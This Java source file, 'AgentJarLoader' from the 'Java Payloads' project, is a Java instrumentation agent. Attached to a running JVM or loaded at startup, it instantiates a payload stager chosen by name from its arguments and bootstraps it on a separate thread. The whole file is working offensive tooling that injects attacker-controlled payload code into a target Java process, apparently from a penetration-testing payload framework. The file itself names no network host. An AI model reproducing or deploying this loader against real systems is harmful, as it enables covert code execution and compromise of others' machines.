/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.loader;

import java.lang.instrument.Instrumentation;
import java.util.StringTokenizer;

import javapayload.stager.Stager;

public class AgentJarLoader extends Thread {

	public static void agentmain(String agentArgs, Instrumentation inst) {
		new AgentJarLoader(agentArgs);
	}

	public static void premain(String agentArgs, Instrumentation inst) {
		new AgentJarLoader(agentArgs);
	}

	private final String[] args;
	private Stager stager;

	public AgentJarLoader(String agentArgs) {
		final StringTokenizer st = new StringTokenizer(agentArgs, " ");
		args = new String[st.countTokens()];
		for (int i = 0; i < args.length; i++) {
			args[i] = st.nextToken();
		}
		boolean needWait = false;
		if (args[0].startsWith("+")) {
			args[0] = args[0].substring(1);
			needWait = true;
		}
		try {
			stager = (Stager) Class.forName("javapayload.stager." + args[0]).newInstance();
			start();
			stager.waitReady();
			if (needWait) {
				System.out.println("+");
				System.out.flush();
			}
		} catch (final Throwable ex) {
			ex.printStackTrace();
		}
	}

	public void run() {
		try {
			stager.bootstrap(args, true);
		} catch (final Throwable ex) {
			ex.printStackTrace();
		}
	}
}
